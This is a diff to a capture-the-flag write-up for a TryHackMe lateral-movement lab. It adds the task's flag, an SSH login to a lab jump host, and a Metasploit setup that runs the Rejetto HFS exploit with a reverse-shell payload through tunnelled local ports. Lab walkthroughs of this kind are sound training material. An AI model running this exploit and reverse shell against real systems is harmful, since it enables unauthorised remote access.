@@ -1233,7 +1233,13 @@ After launching the exploit, you will receive a shell back at the attacker's mac
 
 * What is the flag obtained using the Rejetto HFS exploit on THMDC?
 
-    ``
+    `THM{FORWARDING_IT_ALL}`
+
+    * Login SSH 
+    
+        ```
+        ssh za\\barbara.taylor@thmjmp2.za.tryhackme.com
+        ```
 
     * Setup tunnelling
     
@@ -1243,7 +1249,30 @@ After launching the exploit, you will receive a shell back at the attacker's mac
 
         ![task7-tunnel](./images/task7-tunnel.png)
 
+    * Setup `msfconsole` on attacker machine
+    
+        ```
+        use rejetto_hfs_exec
+        set payload windows/shell_reverse_tcp
 
+        set lhost thmjmp2.za.tryhackme.com
+        set ReverseListenerBindAddress 127.0.0.1
+        set lport 3333 
+
+        set srvhost 127.0.0.1
+        set srvport 2222
+
+        set rhosts 127.0.0.1
+        set rport 9999
+
+        exploit
+        ```
+
+        ![task7-msfconsole](./images/task7-msfconsole.png)
+
+    * Get the flag
+    
+        ![task7-hfs](./images/task7-hfs.png)
 
 ## Task 8 - Conclusion
 
